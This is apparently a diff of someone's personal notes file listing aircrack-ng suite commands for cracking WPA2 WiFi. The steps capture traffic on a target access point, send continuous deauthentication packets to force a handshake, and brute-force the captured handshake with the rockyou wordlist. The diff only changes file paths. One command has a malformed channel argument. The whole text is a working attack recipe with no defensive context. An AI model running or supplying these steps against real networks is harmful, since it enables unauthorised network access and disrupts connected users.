@@ -9,7 +9,7 @@ airodump-ng -w hack1 -c --bssid mac wlan0mon
 aireplay-ng --deauth 0 -a mac wlan0mon
 wait until you get it wpa2 handshake EAPOL
 airmon-ng stop wlan0mon
-aircrack-ng hack-01.cap -w /home/kali/wordlist.txt
+aircrack-ng /home/ghoniv/hack1-01.cap -w /usr/share/wordlists/rockyou.txt
 
 notes
 first time you need to unzip wordlists
